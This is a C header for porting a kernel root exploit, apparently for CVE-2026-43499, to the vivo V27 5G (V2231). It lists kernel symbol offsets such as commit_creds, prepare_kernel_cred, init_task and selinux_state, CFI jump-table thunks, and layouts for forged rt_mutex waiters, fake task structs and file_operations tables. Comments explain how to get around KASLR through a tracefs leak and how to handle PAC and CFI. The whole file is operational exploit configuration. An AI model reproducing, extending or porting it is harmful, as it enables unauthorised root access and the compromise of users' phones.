#ifndef OFFSET_H
#define OFFSET_H

// vivo V27 5G (MediaTek Dimensity 7200 / mt6886) port.
// Device: vivo V2231.
// Kernel: 5.15.178-android13-8-00007-g362d545d31a5-ab14608873.
// The offsets below were checked against payload/kernel_raw.
//
// Everything below was derived offline from the matching raw kernel Image:
//   - BTF blob (struct layouts)          -> tools/extract_btf.py
//   - embedded kallsyms table (symbols)  -> tools/extract_kallsyms.py
//   - capstone disassembly (caller offsets, kmalloc_slab type indices,
//     __get_wchan unwind ranges)
//
// The symbol offsets and struct layouts are specific to this image.
//
// NOT YET VERIFIED ON DEVICE for this V2231 build:
//   P0_PHYS_OFFSET 0x40000000 / P0_KERNEL_PHYS_LOAD 0x44000000 are the
//   standard MediaTek values (DRAM base 0x40000000, lk kernel load 0x44000000).
//   Confirm before/after the first run:
//     adb shell "cat /proc/iomem | head -40"   -> "System RAM" and "Kernel code"
//     adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id
//       (expect 108 = __TRACE_LAST_TYPE(20) + event index 88)
//
// Known device deltas vs the dm2q/dm3q Samsung profiles:
//   - no copy_splice_read symbol; COPY_SPLICE_READ = generic_file_splice_read
//   - configfs symbols are the plain 5.15 names (configfs_read_iter etc.)
//   - kmalloc_slab disasm: type = RECLAIMABLE ? 2 : 1 -> CGROUP=1, RECLAIM=2
//   - wait_for_vfork_done blocks via do_wait_for_common; __get_wchan unwinds
//     past the whole __sched_text chain (17-frame loop), so the vfork caller
//     is the return address in wait_for_vfork_done itself.
//
// Offsets re-derived from the uploaded kernel Image using vmlinux-to-elf +
// capstone disassembly. KIMAGE_TEXT_BASE confirmed 0xffffffc008000000.
// Anchors verified: schedule=0xffffffc0097659ec, wait_for_vfork_done=0xffffffc00813101c,
// worker_thread=0xffffffc008178144.

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif

#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

#define MM_ORDER 3
#define KSNITCH_COLLISIONS 4
#define KERNELSNITCH_VERBOSE 0
#define KERNELSNITCH_MTE_ENABLED 0
#define KERNELSNITCH_THRESHOLD_MULT 10
#define FAKE_WAITER_PRIO 130
#define PSELECT_ENTER_DELAY_USEC 50000

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define SLIDE_MCAST_DOMAIN AF_INET6
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define BUILD_VARIANT_LABEL "vivo-v27-5g-tracefs-shaped-configfs-pipe-root"
#define APP_PHYS_P0_ORACLE 1
#define APP_TRACEFS_SLIDE 1
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
#define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
#define APP_FOPS_BEFORE_PIPE 1
#define APP_EXACT_PIPE_BUFFER_ONLY 1
#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
#define APP_ROOT_REF_HOLDER_REQUIRED 0
#define DEFAULT_EXPLOIT_ATTEMPTS 8
#else
#define BUILD_VARIANT_LABEL "vivo-v27-5g-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "vivo/V2231T/V2231:15/AP3A.240905.015.A2/compiler260325120827:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x40000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x44000000ULL
#endif

#define SKB_DATA_DELTA (-0xe80LL)
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define APP_SLIDE_RECLAIM_SENDS 64
#define PIPE_MAX_ATTEMPTS 12

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#define SLIDE_WAIT_NSEC 2000000000L
// Give the timeout/requeue PI state enough time to settle before the
// EDEADLK probe.  The 50 ms setting still occasionally leaves the chain in
// the transient state that later makes sched_setattr follow a waiter with a
// NULL lock; 100 ms was stable on the reference runs.
#define SLIDE_REQUEUE_ARM_USEC 100000
#define SLIDE_USE_FAKE_TASK 1
#define LEGACY_RT_MUTEX_WAITER 0
#define COMPACT_RT_MUTEX_WAITER 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 108

// Tracefs KASLR-slide oracle: return addresses that appear on the kernel
// stack when a thread is parked inside schedule / worker_thread /
// wait_for_vfork_done.  Derived by disassembling each function in the
// uploaded Image and taking the address of the instruction immediately
// after the deepest blocking bl call.
//
// SLIDE_TRACEFS_WORKER_CALLER_OFF:
//   instruction after "bl schedule" in worker_thread()
//   (was 0x00194758 in dm2q/dm3q profile)
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0001781c0ULL

// SLIDE_TRACEFS_VFORK_CALLER_OFF:
//   instruction after "bl wait_for_common" in wait_for_vfork_done();
//   __get_wchan unwinds past the full __sched_text chain (17-frame loop)
//   so the first non-sched frame is the return into wait_for_vfork_done.
//   (was 0x0014d098 in dm2q/dm3q profile)
#define SLIDE_TRACEFS_VFORK_CALLER_OFF  0x000131064ULL

// This kernel runs PAC-ret (paciasp/autiasp on every function). Saved PCs
// carry APIAKey PAC bits in [54:48], and the __get_wchan unwind loop's
// __sched_text range compares misdetect PAC'd frames depending on the
// per-boot key. Accept the schedule-internal return address (the instruction
// after `bl __schedule` in schedule()) as a second anchor.
// (was 0x00178e52c in dm2q/dm3q profile)
#define SLIDE_TRACEFS_STRIP_PAC 1
#define SLIDE_TRACEFS_SCHED_CALLER_OFF  0x001765b3cULL

// The matching GKI source uses strncpy_from_user()/strscpy() for SET_NAME.
// Reconstruct embedded NULs with descending prefix writes; a verbatim blob
// would truncate at the first NUL and leave the write-only fields unset.
#define ASHMEM_RAW_NAME_BLOB 0
#define ASHMEM_READ_DIAGNOSTICS 1
// This kernel is RELR-relocated: MTK lk loads it at an ARBITRARY 64K-
// aligned virtual base in the kernel VA window (observed
// 0xffffffda1bc00000, i.e. "slide" 0x1a13b80000). The tracefs parse
// computes base = caller - anchor_offset directly and validates it
// against this window; the cap must cover the whole kernel VA range.
#define SLIDE_TRACEFS_MAX_CANDIDATE 0x20000000000ULL
#define SLIDE_MAX_OFFSET 0x20000000000ULL
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define SLIDE_STACK_WRITER_MCAST 1
#define SLIDE_STACK_WRITER_SIGRETURN 2
#ifndef SLIDE_STACK_WRITER
#error vivo-v27-5g stack writer must be set by the build
#endif
// Stack-depth convention: depth is measured down from the C syscall-entry
// SP.  A local at sp+N is at (frame depth - N), not (frame depth + N).
//
// MCAST: __arm64_sys_setsockopt(0x10) + __sys_setsockopt(0x80) +
// sock_common_setsockopt(0x40) + ipv6_setsockopt(0x40) +
// do_ipv6_setsockopt(0x60 + 0x260), with greqs at sp+0x40 = 0x390.
//
// Stale waiter: __arm64_sys_futex(0xa0) + do_futex(0x140) +
// futex_wait_requeue_pi(0x1b0), with tree_entry at sp+0x98 = 0x2f8.
// Therefore the MCAST stamp starts its fake waiter at 0x390 - 0x2f8 = 0x98.
#define MCAST_WAITER_OFF 0x98
// Fake waiter rides the FPSIMD vregs on the SVE restore path.  Its local is
// at depth __arm64_sys_rt_sigreturn(0x50) + restore_sigframe(0x50) +
// restore_sve_fpsimd_context(0x40 + 0x230) - sp_local(0x10) = 0x300.
// Align it to the same stale waiter at depth 0x2f8: 0x300 - 0x2f8 = 0x08.
#define SIGRETURN_FPSIMD_WAITER_OFF 0x08
// The grown SVE record's Z regs are copied to thread.sve_state (heap), not
// the kernel stack, so the SVE-record fake can never land on the stack; it
// is kept harmless.  The growth itself is only useful as a code-path knob.
#define SIGRETURN_SVE_WAITER_OFF 0x8
#define SIGRETURN_GROW_SVE 1
#define SIGRETURN_SVE_ZREGS_OFF 0x10
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/vivo-v27-5g/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END

#define APPENDED_FUTEXES 4096
#define REPEAT_MEASUREMENT 128
#define AVERAGE 8
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32

#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL

// All offsets below re-derived from the uploaded kernel Image.
// Symbol -> (symbol name used)
#define INIT_TASK_OFF             0x02c33580ULL  // init_task
#define PREPARE_KERNEL_CRED_OFF   0x000189ca4ULL  // prepare_kernel_cred
#define COMMIT_CREDS_OFF          0x00018af08ULL  // commit_creds
#define OVERRIDE_CREDS_OFF        0x00018a614ULL  // override_creds
#define ROOT_TASK_GROUP_OFF       0x02d47ac0ULL  // root_task_group
#define SELINUX_ENFORCING_OFF     0x02d99cf0ULL  // selinux_state
#define KMALLOC_CACHES_OFF        0x02153b00ULL  // kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF     0x01f74430ULL  // anon_pipe_buf_ops
#define SYSTEM_UNBOUND_WQ_OFF     0x02af07d8ULL  // system_unbound_wq
#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0x00016e4d4ULL  // call_usermodehelper_exec_work
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF  0x001762428ULL  // call_usermodehelper_exec_work.cfi_jt

#define ASHMEM_FOPS_OFF           0x020f1918ULL  // ashmem_fops
#define ASHMEM_MISC_FOPS_OFF      0x02c81c40ULL  // ashmem_misc.fops (ashmem_misc + 0x10)
#define ASHMEM_IOCTL_OFF          0x0113bcb4ULL  // ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF   0x0113c364ULL  // compat_ashmem_ioctl
#define ASHMEM_MMAP_OFF           0x0113c3c4ULL  // ashmem_mmap
#define ASHMEM_OPEN_OFF           0x0113c6b4ULL  // ashmem_open
#define ASHMEM_RELEASE_OFF        0x0113c754ULL  // ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF    0x0113c878ULL  // ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF    0x000675354ULL  // configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x000675e78ULL  // configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF      0x0005c2c50ULL  // generic_file_splice_read
#define NOOP_LLSEEK_OFF           0x000550380ULL  // noop_llseek

/* This image has Clang CFI enabled.  Function pointers stored in kernel
 * file_operations tables use the corresponding .cfi_jt thunks; pointing a
 * forged table at the direct function bodies reaches __cfi_check_fail. */
#define ASHMEM_IOCTL_CFI_JT_OFF       0x00175b4e0ULL  // ashmem_ioctl.cfi_jt
#define ASHMEM_COMPAT_IOCTL_CFI_JT_OFF 0x00175b4e8ULL  // compat_ashmem_ioctl.cfi_jt
#define ASHMEM_MMAP_CFI_JT_OFF        0x001744808ULL  // ashmem_mmap.cfi_jt
#define ASHMEM_OPEN_CFI_JT_OFF        0x001754658ULL  // ashmem_open.cfi_jt
#define ASHMEM_RELEASE_CFI_JT_OFF     0x001754660ULL  // ashmem_release.cfi_jt
#define ASHMEM_SHOW_FDINFO_CFI_JT_OFF 0x001744998ULL  // ashmem_show_fdinfo.cfi_jt
#define CONFIGFS_READ_ITER_CFI_JT_OFF 0x0017445a8ULL  // configfs_read_iter.cfi_jt
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT_OFF 0x0017445c0ULL  // configfs_bin_write_iter.cfi_jt
#define COPY_SPLICE_READ_CFI_JT_OFF   0x001744908ULL  // generic_file_splice_read.cfi_jt
#define NOOP_LLSEEK_CFI_JT_OFF        0x001741ab8ULL  // noop_llseek.cfi_jt

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define ASHMEM_IOCTL_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_CFI_JT_OFF)
#define ASHMEM_COMPAT_IOCTL_CFI_JT \
  (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_CFI_JT_OFF)
#define ASHMEM_MMAP_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_MMAP_CFI_JT_OFF)
#define ASHMEM_OPEN_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_OPEN_CFI_JT_OFF)
#define ASHMEM_RELEASE_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_CFI_JT_OFF)
#define ASHMEM_SHOW_FDINFO_CFI_JT \
  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_CFI_JT_OFF)
#define CONFIGFS_READ_ITER_CFI_JT \
  (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_CFI_JT_OFF)
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT \
  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_CFI_JT_OFF)
#define COPY_SPLICE_READ_CFI_JT \
  (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_CFI_JT_OFF)
#define NOOP_LLSEEK_CFI_JT (KIMAGE_TEXT_BASE + NOOP_LLSEEK_CFI_JT_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

// nfulnl_logger_name: first qword of nfulnl_logger (= char* to "nfnetlink_log" string)
#define SLIDE_NFULNL_LOGGER_NAME_OFF    0x001e59f49ULL  // "nfnetlink_log" string in .rodata
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF  0x002af1e28ULL  // nfulnl_logger symbol
// random_table sysctl entry for boot_id: .data ptr field (entry 4 of random_table[])
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x002c27280ULL  // &random_table[4].data
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF         0x002db5799ULL  // sysctl_bootid

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_PI_LOCK_OFF 0x884
#define FAKE_TASK_PI_WAITERS_OFF 0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
